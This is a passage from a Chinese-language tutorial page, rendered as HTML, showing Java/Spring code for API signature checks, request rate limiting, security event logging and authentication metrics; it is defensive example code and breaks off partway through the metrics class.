</span><span id="__span-145-34"><a id="__codelineno-145-34" name="__codelineno-145-34" href="#__codelineno-145-34"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">expectedSignature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">calculateSignature</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">timestamp</span><span class="p">);</span>
</span><span id="__span-145-35"><a id="__codelineno-145-35" name="__codelineno-145-35" href="#__codelineno-145-35"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">signature</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">expectedSignature</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-145-36"><a id="__codelineno-145-36" name="__codelineno-145-36" href="#__codelineno-145-36"></a><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvalidSignatureException</span><span class="p">();</span>
</span><span id="__span-145-37"><a id="__codelineno-145-37" name="__codelineno-145-37" href="#__codelineno-145-37"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-145-38"><a id="__codelineno-145-38" name="__codelineno-145-38" href="#__codelineno-145-38"></a>
</span><span id="__span-145-39"><a id="__codelineno-145-39" name="__codelineno-145-39" href="#__codelineno-145-39"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">paymentService</span><span class="p">.</span><span class="na">process</span><span class="p">(</span><span class="n">request</span><span class="p">);</span>
</span><span id="__span-145-40"><a id="__codelineno-145-40" name="__codelineno-145-40" href="#__codelineno-145-40"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>速率限制：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-146-1"><a id="__codelineno-146-1" name="__codelineno-146-1" href="#__codelineno-146-1"></a><span class="cm">/**</span>
</span><span id="__span-146-2"><a id="__codelineno-146-2" name="__codelineno-146-2" href="#__codelineno-146-2"></a><span class="cm"> * API速率限制（防止滥用）</span>
</span><span id="__span-146-3"><a id="__codelineno-146-3" name="__codelineno-146-3" href="#__codelineno-146-3"></a><span class="cm"> */</span>
</span><span id="__span-146-4"><a id="__codelineno-146-4" name="__codelineno-146-4" href="#__codelineno-146-4"></a><span class="nd">@Component</span>
</span><span id="__span-146-5"><a id="__codelineno-146-5" name="__codelineno-146-5" href="#__codelineno-146-5"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RateLimiter</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-146-6"><a id="__codelineno-146-6" name="__codelineno-146-6" href="#__codelineno-146-6"></a>
</span><span id="__span-146-7"><a id="__codelineno-146-7" name="__codelineno-146-7" href="#__codelineno-146-7"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">LoadingCache</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">AtomicInteger</span><span class="o">&gt;</span><span class="w"> </span><span class="n">requestCounts</span><span class="p">;</span>
</span><span id="__span-146-8"><a id="__codelineno-146-8" name="__codelineno-146-8" href="#__codelineno-146-8"></a>
</span><span id="__span-146-9"><a id="__codelineno-146-9" name="__codelineno-146-9" href="#__codelineno-146-9"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">RateLimiter</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-146-10"><a id="__codelineno-146-10" name="__codelineno-146-10" href="#__codelineno-146-10"></a><span class="w">        </span><span class="n">requestCounts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CacheBuilder</span><span class="p">.</span><span class="na">newBuilder</span><span class="p">()</span>
</span><span id="__span-146-11"><a id="__codelineno-146-11" name="__codelineno-146-11" href="#__codelineno-146-11"></a><span class="w">            </span><span class="p">.</span><span class="na">expireAfterWrite</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">TimeUnit</span><span class="p">.</span><span class="na">MINUTES</span><span class="p">)</span>
</span><span id="__span-146-12"><a id="__codelineno-146-12" name="__codelineno-146-12" href="#__codelineno-146-12"></a><span class="w">            </span><span class="p">.</span><span class="na">build</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">CacheLoader</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">AtomicInteger</span><span class="o">&gt;</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-146-13"><a id="__codelineno-146-13" name="__codelineno-146-13" href="#__codelineno-146-13"></a><span class="w">                </span><span class="kd">public</span><span class="w"> </span><span class="n">AtomicInteger</span><span class="w"> </span><span class="nf">load</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-146-14"><a id="__codelineno-146-14" name="__codelineno-146-14" href="#__codelineno-146-14"></a><span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AtomicInteger</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span id="__span-146-15"><a id="__codelineno-146-15" name="__codelineno-146-15" href="#__codelineno-146-15"></a><span class="w">                </span><span class="p">}</span>
</span><span id="__span-146-16"><a id="__codelineno-146-16" name="__codelineno-146-16" href="#__codelineno-146-16"></a><span class="w">            </span><span class="p">});</span>
</span><span id="__span-146-17"><a id="__codelineno-146-17" name="__codelineno-146-17" href="#__codelineno-146-17"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-146-18"><a id="__codelineno-146-18" name="__codelineno-146-18" href="#__codelineno-146-18"></a>
</span><span id="__span-146-19"><a id="__codelineno-146-19" name="__codelineno-146-19" href="#__codelineno-146-19"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-146-20"><a id="__codelineno-146-20" name="__codelineno-146-20" href="#__codelineno-146-20"></a><span class="cm">     * 检查是否超过限制</span>
</span><span id="__span-146-21"><a id="__codelineno-146-21" name="__codelineno-146-21" href="#__codelineno-146-21"></a><span class="cm">     * @param identifier 标识符（IP、用户ID、API Key）</span>
</span><span id="__span-146-22"><a id="__codelineno-146-22" name="__codelineno-146-22" href="#__codelineno-146-22"></a><span class="cm">     * @param limit 每分钟最大请求数</span>
</span><span id="__span-146-23"><a id="__codelineno-146-23" name="__codelineno-146-23" href="#__codelineno-146-23"></a><span class="cm">     */</span>
</span><span id="__span-146-24"><a id="__codelineno-146-24" name="__codelineno-146-24" href="#__codelineno-146-24"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">allowRequest</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">identifier</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">limit</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-146-25"><a id="__codelineno-146-25" name="__codelineno-146-25" href="#__codelineno-146-25"></a><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-146-26"><a id="__codelineno-146-26" name="__codelineno-146-26" href="#__codelineno-146-26"></a><span class="w">            </span><span class="n">AtomicInteger</span><span class="w"> </span><span class="n">counter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">requestCounts</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">identifier</span><span class="p">);</span>
</span><span id="__span-146-27"><a id="__codelineno-146-27" name="__codelineno-146-27" href="#__codelineno-146-27"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">counter</span><span class="p">.</span><span class="na">incrementAndGet</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">limit</span><span class="p">;</span>
</span><span id="__span-146-28"><a id="__codelineno-146-28" name="__codelineno-146-28" href="#__codelineno-146-28"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ExecutionException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-146-29"><a id="__codelineno-146-29" name="__codelineno-146-29" href="#__codelineno-146-29"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"> </span><span class="c1">// 出错时允许请求</span>
</span><span id="__span-146-30"><a id="__codelineno-146-30" name="__codelineno-146-30" href="#__codelineno-146-30"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-146-31"><a id="__codelineno-146-31" name="__codelineno-146-31" href="#__codelineno-146-31"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-146-32"><a id="__codelineno-146-32" name="__codelineno-146-32" href="#__codelineno-146-32"></a><span class="p">}</span>
</span><span id="__span-146-33"><a id="__codelineno-146-33" name="__codelineno-146-33" href="#__codelineno-146-33"></a>
</span><span id="__span-146-34"><a id="__codelineno-146-34" name="__codelineno-146-34" href="#__codelineno-146-34"></a><span class="c1">// 使用拦截器应用速率限制</span>
</span><span id="__span-146-35"><a id="__codelineno-146-35" name="__codelineno-146-35" href="#__codelineno-146-35"></a><span class="nd">@Component</span>
</span><span id="__span-146-36"><a id="__codelineno-146-36" name="__codelineno-146-36" href="#__codelineno-146-36"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RateLimitInterceptor</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">HandlerInterceptor</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-146-37"><a id="__codelineno-146-37" name="__codelineno-146-37" href="#__codelineno-146-37"></a>
</span><span id="__span-146-38"><a id="__codelineno-146-38" name="__codelineno-146-38" href="#__codelineno-146-38"></a><span class="w">    </span><span class="nd">@Autowired</span>
</span><span id="__span-146-39"><a id="__codelineno-146-39" name="__codelineno-146-39" href="#__codelineno-146-39"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">RateLimiter</span><span class="w"> </span><span class="n">rateLimiter</span><span class="p">;</span>
</span><span id="__span-146-40"><a id="__codelineno-146-40" name="__codelineno-146-40" href="#__codelineno-146-40"></a>
</span><span id="__span-146-41"><a id="__codelineno-146-41" name="__codelineno-146-41" href="#__codelineno-146-41"></a><span class="w">    </span><span class="nd">@Override</span>
</span><span id="__span-146-42"><a id="__codelineno-146-42" name="__codelineno-146-42" href="#__codelineno-146-42"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">preHandle</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-146-43"><a id="__codelineno-146-43" name="__codelineno-146-43" href="#__codelineno-146-43"></a><span class="w">                            </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-146-44"><a id="__codelineno-146-44" name="__codelineno-146-44" href="#__codelineno-146-44"></a><span class="w">                            </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-146-45"><a id="__codelineno-146-45" name="__codelineno-146-45" href="#__codelineno-146-45"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">clientId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getClientIdentifier</span><span class="p">(</span><span class="n">request</span><span class="p">);</span>
</span><span id="__span-146-46"><a id="__codelineno-146-46" name="__codelineno-146-46" href="#__codelineno-146-46"></a>
</span><span id="__span-146-47"><a id="__codelineno-146-47" name="__codelineno-146-47" href="#__codelineno-146-47"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">rateLimiter</span><span class="p">.</span><span class="na">allowRequest</span><span class="p">(</span><span class="n">clientId</span><span class="p">,</span><span class="w"> </span><span class="mi">100</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// 100次/分钟</span>
</span><span id="__span-146-48"><a id="__codelineno-146-48" name="__codelineno-146-48" href="#__codelineno-146-48"></a><span class="w">            </span><span class="n">response</span><span class="p">.</span><span class="na">setStatus</span><span class="p">(</span><span class="mi">429</span><span class="p">);</span><span class="w"> </span><span class="c1">// Too Many Requests</span>
</span><span id="__span-146-49"><a id="__codelineno-146-49" name="__codelineno-146-49" href="#__codelineno-146-49"></a><span class="w">            </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">write</span><span class="p">(</span><span class="s">&quot;Rate limit exceeded&quot;</span><span class="p">);</span>
</span><span id="__span-146-50"><a id="__codelineno-146-50" name="__codelineno-146-50" href="#__codelineno-146-50"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
</span><span id="__span-146-51"><a id="__codelineno-146-51" name="__codelineno-146-51" href="#__codelineno-146-51"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-146-52"><a id="__codelineno-146-52" name="__codelineno-146-52" href="#__codelineno-146-52"></a>
</span><span id="__span-146-53"><a id="__codelineno-146-53" name="__codelineno-146-53" href="#__codelineno-146-53"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
</span><span id="__span-146-54"><a id="__codelineno-146-54" name="__codelineno-146-54" href="#__codelineno-146-54"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-146-55"><a id="__codelineno-146-55" name="__codelineno-146-55" href="#__codelineno-146-55"></a>
</span><span id="__span-146-56"><a id="__codelineno-146-56" name="__codelineno-146-56" href="#__codelineno-146-56"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getClientIdentifier</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-146-57"><a id="__codelineno-146-57" name="__codelineno-146-57" href="#__codelineno-146-57"></a><span class="w">        </span><span class="c1">// 优先使用用户ID，其次使用IP</span>
</span><span id="__span-146-58"><a id="__codelineno-146-58" name="__codelineno-146-58" href="#__codelineno-146-58"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">userId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&quot;userId&quot;</span><span class="p">);</span>
</span><span id="__span-146-59"><a id="__codelineno-146-59" name="__codelineno-146-59" href="#__codelineno-146-59"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">userId</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">userId</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getRemoteAddr</span><span class="p">();</span>
</span><span id="__span-146-60"><a id="__codelineno-146-60" name="__codelineno-146-60" href="#__codelineno-146-60"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-146-61"><a id="__codelineno-146-61" name="__codelineno-146-61" href="#__codelineno-146-61"></a><span class="p">}</span>
</span></code></pre></div></p>
<h3 id="4-日志与监控">4. 日志与监控<a class="headerlink" href="#4-日志与监控" title="链接到此标题">&para;</a></h3>
<p><strong>安全日志记录：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-147-1"><a id="__codelineno-147-1" name="__codelineno-147-1" href="#__codelineno-147-1"></a><span class="cm">/**</span>
</span><span id="__span-147-2"><a id="__codelineno-147-2" name="__codelineno-147-2" href="#__codelineno-147-2"></a><span class="cm"> * 安全事件日志</span>
</span><span id="__span-147-3"><a id="__codelineno-147-3" name="__codelineno-147-3" href="#__codelineno-147-3"></a><span class="cm"> */</span>
</span><span id="__span-147-4"><a id="__codelineno-147-4" name="__codelineno-147-4" href="#__codelineno-147-4"></a><span class="nd">@Component</span>
</span><span id="__span-147-5"><a id="__codelineno-147-5" name="__codelineno-147-5" href="#__codelineno-147-5"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SecurityLogger</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-147-6"><a id="__codelineno-147-6" name="__codelineno-147-6" href="#__codelineno-147-6"></a>
</span><span id="__span-147-7"><a id="__codelineno-147-7" name="__codelineno-147-7" href="#__codelineno-147-7"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Logger</span><span class="w"> </span><span class="n">logger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LoggerFactory</span><span class="p">.</span><span class="na">getLogger</span><span class="p">(</span><span class="n">SecurityLogger</span><span class="p">.</span><span class="na">class</span><span class="p">);</span>
</span><span id="__span-147-8"><a id="__codelineno-147-8" name="__codelineno-147-8" href="#__codelineno-147-8"></a>
</span><span id="__span-147-9"><a id="__codelineno-147-9" name="__codelineno-147-9" href="#__codelineno-147-9"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-147-10"><a id="__codelineno-147-10" name="__codelineno-147-10" href="#__codelineno-147-10"></a><span class="cm">     * 记录登录成功</span>
</span><span id="__span-147-11"><a id="__codelineno-147-11" name="__codelineno-147-11" href="#__codelineno-147-11"></a><span class="cm">     */</span>
</span><span id="__span-147-12"><a id="__codelineno-147-12" name="__codelineno-147-12" href="#__codelineno-147-12"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">logLoginSuccess</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">ip</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-147-13"><a id="__codelineno-147-13" name="__codelineno-147-13" href="#__codelineno-147-13"></a><span class="w">        </span><span class="n">logger</span><span class="p">.</span><span class="na">info</span><span class="p">(</span><span class="s">&quot;Login successful - User: {}, IP: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">ip</span><span class="p">);</span>
</span><span id="__span-147-14"><a id="__codelineno-147-14" name="__codelineno-147-14" href="#__codelineno-147-14"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-147-15"><a id="__codelineno-147-15" name="__codelineno-147-15" href="#__codelineno-147-15"></a>
</span><span id="__span-147-16"><a id="__codelineno-147-16" name="__codelineno-147-16" href="#__codelineno-147-16"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-147-17"><a id="__codelineno-147-17" name="__codelineno-147-17" href="#__codelineno-147-17"></a><span class="cm">     * 记录登录失败</span>
</span><span id="__span-147-18"><a id="__codelineno-147-18" name="__codelineno-147-18" href="#__codelineno-147-18"></a><span class="cm">     */</span>
</span><span id="__span-147-19"><a id="__codelineno-147-19" name="__codelineno-147-19" href="#__codelineno-147-19"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">logLoginFailure</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">ip</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">reason</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-147-20"><a id="__codelineno-147-20" name="__codelineno-147-20" href="#__codelineno-147-20"></a><span class="w">        </span><span class="n">logger</span><span class="p">.</span><span class="na">warn</span><span class="p">(</span><span class="s">&quot;Login failed - User: {}, IP: {}, Reason: {}&quot;</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-147-21"><a id="__codelineno-147-21" name="__codelineno-147-21" href="#__codelineno-147-21"></a><span class="w">            </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">ip</span><span class="p">,</span><span class="w"> </span><span class="n">reason</span><span class="p">);</span>
</span><span id="__span-147-22"><a id="__codelineno-147-22" name="__codelineno-147-22" href="#__codelineno-147-22"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-147-23"><a id="__codelineno-147-23" name="__codelineno-147-23" href="#__codelineno-147-23"></a>
</span><span id="__span-147-24"><a id="__codelineno-147-24" name="__codelineno-147-24" href="#__codelineno-147-24"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-147-25"><a id="__codelineno-147-25" name="__codelineno-147-25" href="#__codelineno-147-25"></a><span class="cm">     * 记录访问被拒绝</span>
</span><span id="__span-147-26"><a id="__codelineno-147-26" name="__codelineno-147-26" href="#__codelineno-147-26"></a><span class="cm">     */</span>
</span><span id="__span-147-27"><a id="__codelineno-147-27" name="__codelineno-147-27" href="#__codelineno-147-27"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">logAccessDenied</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">resource</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">action</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-147-28"><a id="__codelineno-147-28" name="__codelineno-147-28" href="#__codelineno-147-28"></a><span class="w">        </span><span class="n">logger</span><span class="p">.</span><span class="na">warn</span><span class="p">(</span><span class="s">&quot;Access denied - User: {}, Resource: {}, Action: {}&quot;</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-147-29"><a id="__codelineno-147-29" name="__codelineno-147-29" href="#__codelineno-147-29"></a><span class="w">            </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">resource</span><span class="p">,</span><span class="w"> </span><span class="n">action</span><span class="p">);</span>
</span><span id="__span-147-30"><a id="__codelineno-147-30" name="__codelineno-147-30" href="#__codelineno-147-30"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-147-31"><a id="__codelineno-147-31" name="__codelineno-147-31" href="#__codelineno-147-31"></a>
</span><span id="__span-147-32"><a id="__codelineno-147-32" name="__codelineno-147-32" href="#__codelineno-147-32"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-147-33"><a id="__codelineno-147-33" name="__codelineno-147-33" href="#__codelineno-147-33"></a><span class="cm">     * 记录可疑活动</span>
</span><span id="__span-147-34"><a id="__codelineno-147-34" name="__codelineno-147-34" href="#__codelineno-147-34"></a><span class="cm">     */</span>
</span><span id="__span-147-35"><a id="__codelineno-147-35" name="__codelineno-147-35" href="#__codelineno-147-35"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">logSuspiciousActivity</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">activity</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-147-36"><a id="__codelineno-147-36" name="__codelineno-147-36" href="#__codelineno-147-36"></a><span class="w">                                     </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">details</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-147-37"><a id="__codelineno-147-37" name="__codelineno-147-37" href="#__codelineno-147-37"></a><span class="w">        </span><span class="n">logger</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">&quot;Suspicious activity detected - User: {}, Activity: {}, Details: {}&quot;</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-147-38"><a id="__codelineno-147-38" name="__codelineno-147-38" href="#__codelineno-147-38"></a><span class="w">            </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">activity</span><span class="p">,</span><span class="w"> </span><span class="n">details</span><span class="p">);</span>
</span><span id="__span-147-39"><a id="__codelineno-147-39" name="__codelineno-147-39" href="#__codelineno-147-39"></a>
</span><span id="__span-147-40"><a id="__codelineno-147-40" name="__codelineno-147-40" href="#__codelineno-147-40"></a><span class="w">        </span><span class="c1">// 触发告警</span>
</span><span id="__span-147-41"><a id="__codelineno-147-41" name="__codelineno-147-41" href="#__codelineno-147-41"></a><span class="w">        </span><span class="n">alertService</span><span class="p">.</span><span class="na">sendSecurityAlert</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">activity</span><span class="p">,</span><span class="w"> </span><span class="n">details</span><span class="p">);</span>
</span><span id="__span-147-42"><a id="__codelineno-147-42" name="__codelineno-147-42" href="#__codelineno-147-42"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-147-43"><a id="__codelineno-147-43" name="__codelineno-147-43" href="#__codelineno-147-43"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>监控指标：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-148-1"><a id="__codelineno-148-1" name="__codelineno-148-1" href="#__codelineno-148-1"></a><span class="c1">// 使用Micrometer监控认证指标</span>
</span><span id="__span-148-2"><a id="__codelineno-148-2" name="__codelineno-148-2" href="#__codelineno-148-2"></a><span class="nd">@Component</span>
</span><span id="__span-148-3"><a id="__codelineno-148-3" name="__codelineno-148-3" href="#__codelineno-148-3"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">AuthenticationMetrics</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-148-4"><a id="__codelineno-148-4" name="__codelineno-148-4" href="#__codelineno-148-4"></a>
</span><span id="__span-148-5"><a id="__codelineno-148-5" name="__codelineno-148-5" href="#__codelineno-148-5"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Counter</span><span class="w"> </span><span class="n">loginAttempts</span><span class="p">;</span>
</span><span id="__span-148-6"><a id="__codelineno-148-6" name="__codelineno-148-6" href="#__codelineno-148-6"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Counter</span><span class="w"> </span><span class="n">loginSuccesses</span><span class="p">;</span>
</span><span id="__span-148-7"><a id="__codelineno-148-7" name="__codelineno-148-7" href="#__codelineno-148-7"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Counter</span><span class="w"> </span><span class="n">loginFailures</span><span class="p">;</span>
</span><span id="__span-148-8"><a id="__codelineno-148-8" name="__codelineno-148-8" href="#__codelineno-148-8"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Timer</span><span class="w"> </span><span class="n">authenticationTime</span><span class="p">;</span>
</span><span id="__span-148-9"><a id="__codelineno-148-9" name="__codelineno-148-9" href="#__codelineno-148-9"></a>
</span><span id="__span-148-10"><a id="__codelineno-148-10" name="__codelineno-148-10" href="#__codelineno-148-10"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">AuthenticationMetrics</span><span class="p">(</span><span class="n">MeterRegistry</span><span class="w"> </span><span class="n">registry</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-148-11"><a id="__codelineno-148-11" name="__codelineno-148-11" href="#__codelineno-148-11"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">loginAttempts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Counter</span><span class="p">.</span><span class="na">builder</span><span class="p">(</span><span class="s">&quot;auth.login.attempts&quot;</span><span class="p">)</span>
</span><span id="__span-148-12"><a id="__codelineno-148-12" name="__codelineno-148-12" href="#__codelineno-148-12"></a><span class="w">            </span><span class="p">.</span><span class="na">description</span><span class="p">(</span><span class="s">&quot;Total login attempts&quot;</span><span class="p">)</span>
</span><span id="__span-148-13"><a id="__codelineno-148-13" name="__codelineno-148-13" href="#__codelineno-148-13"></a><span class="w">            </span><span class="p">.</span><span class="na">register</span><span class="p">(</span><span class="n">registry</span><span class="p">);</span>
</span><span id="__span-148-14"><a id="__codelineno-148-14" name="__codelineno-148-14" href="#__codelineno-148-14"></a>
</span><span id="__span-148-15"><a id="__codelineno-148-15" name="__codelineno-148-15" href="#__codelineno-148-15"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">loginSuccesses</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Counter</span><span class="p">.</span><span class="na">builder</span><span class="p">(</span><span class="s">&quot;auth.login.successes&quot;</span><span class="p">)</span>
</span><span id="__span-148-16"><a id="__codelineno-148-16" name="__codelineno-148-16" href="#__codelineno-148-16"></a><span class="w">            </span><span class="p">.</span><span class="na">description</span><span class="p">(</span><span class="s">&quot;Successful logins&quot;</span><span class="p">)</span>
</span><span id="__span-148-17"><a id="__codelineno-148-17" name="__codelineno-148-17" href="#__codelineno-148-17"></a><span class="w">            </span><span class="p">.</span><span class="na">register</span><span class="p">(</span><span class="n">registry</span><span class="p">);</span>
</span><span id="__span-148-18"><a id="__codelineno-148-18" name="__codelineno-148-18" href="#__codelineno-148-18"></a>
